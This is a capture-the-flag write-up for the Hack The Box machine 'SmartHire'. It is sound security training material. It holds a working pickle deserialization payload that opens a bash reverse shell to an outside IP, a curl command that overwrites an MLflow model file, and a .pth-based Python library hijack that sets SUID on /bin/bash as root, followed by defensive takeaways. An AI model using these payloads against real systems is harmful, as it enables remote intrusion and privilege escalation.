# HTB Write-Up: SmartHire

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/SmartHire)  |
| Difficulty | Medium                                                         |
| OS         | Linux (Ubuntu)                                                 |
| Date       | May 18, 2026                                                   |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access — Malicious Pickle via MLflow Model Registry](#2-initial-access--malicious-pickle-via-mlflow-model-registry)
3. [Privilege Escalation — Python Library Hijack via sudo mlflowctl.py](#3-privilege-escalation--python-library-hijack-via-sudo-mlflowctlpy)
4. [Summary](#4-summary)

---

## 1. Reconnaissance

### 1.1 — Web Application Enumeration

Navigating to `http://smarthire.htb` revealed an AI-powered hiring platform. The application accepts CSV resume uploads and scores candidates using a machine learning model.

The required CSV format was:

```
experience,skills
60,"Python, Machine Learning, SQL"
```

Uploading a valid CSV returned:

```json
{
  "model_info": {
    "creation_timestamp": 1779116315694,
    "description": "No description",
    "version": "1"
  },
  "prediction": [70],
  "status": "success"
}
```

The response also revealed the model name: `hackers-855d9ebb370d-model`. This naming convention — combined with the version field — strongly suggested an **MLflow** model registry backend.

### 1.2 — Subdomain Discovery

Virtual host enumeration revealed a subdomain:

```
models.smarthire.htb
```

Accessing it returned HTTP 401 with the header:

```
WWW-Authenticate: Basic realm="mlflow"
```

Confirming this is the **MLflow model registry UI**, protected by HTTP Basic Auth.

### 1.3 — MLflow Credential Discovery

Default credentials were tested against the MLflow endpoint:

```bash
curl -u admin:password http://models.smarthire.htb
```

**Result: Access granted.** The MLflow 2.14.1 UI was accessible with `admin:password`.

Inside the UI, the experiment run `polite-zebra-816` was visible, linked to the model `hackers-855d9ebb370d-model` version 2, with run ID `151a74d47ced42ac8e984c9778fc343b`.

---

## 2. Initial Access — Malicious Pickle via MLflow Model Registry

### 2.1 — Attack Overview

MLflow stores Python models serialized with **CloudPickle**. When the `/predict` endpoint loads a model to score an uploaded CSV, it deserializes the stored `python_model.pkl` file. If we can **overwrite this file** with a malicious pickle, we achieve **Remote Code Execution**.

### 2.2 — Generating the Malicious Pickle

A minimal pickle payload was crafted using Python's `os.system` reduce trick:

```python
# exploit.py
import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.15.222/4444 0>&1'"
        return (os.system, (cmd,))

with open("malicious.pkl", "wb") as f:
    f.write(pickle.dumps(Exploit()))

print("Done! malicious.pkl created")
```

```bash
python3 exploit.py
```

### 2.3 — Uploading the Malicious Pickle via MLflow Artifacts API

The MLflow artifacts REST API accepts `PUT` requests to overwrite stored model files:

```bash
curl -u admin:password -X PUT \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/151a74d47ced42ac8e984c9778fc343b/artifacts/model/python_model.pkl" \
  --data-binary @./malicious.pkl \
  -H "Content-Type: application/octet-stream"
```

**Response: `{}`** (HTTP 200) — the malicious pickle was successfully uploaded, overwriting the legitimate model file.

### 2.4 — Triggering Execution

A netcat listener was started, then the `/predict` endpoint was called to load the model:

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — trigger model load
curl -X POST http://smarthire.htb/predict \
  -b "session=<YOUR_SESSION_COOKIE>" \
  -F "file=@test.csv"
```

When the application loaded the model for scoring, the malicious pickle was deserialized and the reverse shell executed.

**Result — shell obtained as `svcweb`:**

```
svcweb@smarthire:~$
```

---

## 3. Privilege Escalation — Python Library Hijack via sudo mlflowctl.py

### 3.1 — Sudo Enumeration

```bash
sudo -l
```

**Output:**

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

The user can run a specific Python script as root with any arguments (`*`).

### 3.2 — Analysing mlflowctl.py

```python
from pathlib import Path
import sys, site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def main():
    import mlflow_actions, backup_models
    ...
```

The script iterates over all subdirectories in `plugins/` and adds each to `sys.path` via `site.addsitedir()`. It then imports `mlflow_actions` and `backup_models` by name.

### 3.3 — Plugins Directory Analysis

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x 3 root root 4096 core
drwxrwxr-x 2 root devs 4096 dev
```

The `dev/` directory is **writable by the `devs` group**. Checking group membership:

```bash
id
# uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

`svcweb` is in the `devs` group — we can write to `dev/`.

The `core/` directory contains the legitimate `mlflow_actions.py` and `backup_models.py`, along with compiled `__pycache__` `.pyc` files which Python loads preferentially.

### 3.4 — Forcing dev/ to Load First via .pth File

`site.addsitedir()` processes `.pth` files found in each directory. A `.pth` file containing a Python `import` statement is executed at import time. We abused this to **force `dev/` to the front of `sys.path`**:

```bash
cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF
```

### 3.5 — Dropping the Malicious Module

With `dev/` now at position 0 in `sys.path`, our `mlflow_actions.py` would be imported before `core/`'s version:

```bash
echo 'import os; os.system("chmod +s /bin/bash")' > \
  /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py
```

### 3.6 — Triggering as Root

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Even though the script raised an `AttributeError` (our fake module had no `check_status` function), **`chmod +s /bin/bash` had already executed** before the error.

### 3.7 — Root Shell

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1396520 Mar 14 2024 /bin/bash

/bin/bash -p
whoami
# root

cat /root/root.txt
# 78381ce860d9b41fa44c549e40bec1d6
```

---

## 4. Summary

| Phase                   | Technique                                                              | Result                              |
|-------------------------|------------------------------------------------------------------------|-------------------------------------|
| Recon                   | CSV upload analysis + subdomain enumeration                            | MLflow UI discovered at `models.smarthire.htb` |
| Credential Discovery    | Default credential testing (`admin:password`)                          | MLflow admin access                 |
| Artifact Overwrite      | MLflow REST API `PUT` to overwrite `python_model.pkl`                  | Malicious pickle uploaded           |
| Initial Access          | Pickle deserialization RCE triggered via `/predict`                    | Shell as `svcweb`                   |
| Sudo Enumeration        | `sudo -l`                                                              | `mlflowctl.py` runnable as root with wildcard args |
| Path Analysis           | Writable `dev/` plugin directory in `devs` group                       | Write access to `sys.path` source   |
| Library Hijack          | `.pth` file forces `dev/` to front of `sys.path` + malicious module   | `chmod +s /bin/bash` executed as root |
| Root                    | `/bin/bash -p`                                                         | `root` shell + flag                 |

### Key Takeaways

- **ML model registries are a critical attack surface.** MLflow's artifact API allows authenticated users to overwrite stored model files. Since models are deserialized with pickle on load, any attacker with registry write access can achieve RCE. MLflow deployments should enforce strict artifact access controls and avoid exposing the registry to untrusted users.

- **Default credentials on internal services are dangerous.** The MLflow instance was protected only by `admin:password`. Internal tooling is frequently overlooked in credential rotation policies — every service should require strong, unique credentials regardless of whether it is internet-facing.

- **`site.addsitedir()` with user-writable directories is a privilege escalation primitive.** Adding a writable directory to `sys.path` at runtime — especially in a script run with elevated privileges — allows full control over which modules are imported. `.pth` files within those directories are executed automatically, enabling `sys.path` manipulation before any imports occur. Scripts run via `sudo` must never add user-writable paths to the Python module search path.

- **SUID bash from a partial script crash is still a win.** The payload executed (`chmod +s /bin/bash`) before the `AttributeError` was raised — demonstrating that RCE via import side effects does not require the hijacked module to be fully functional.
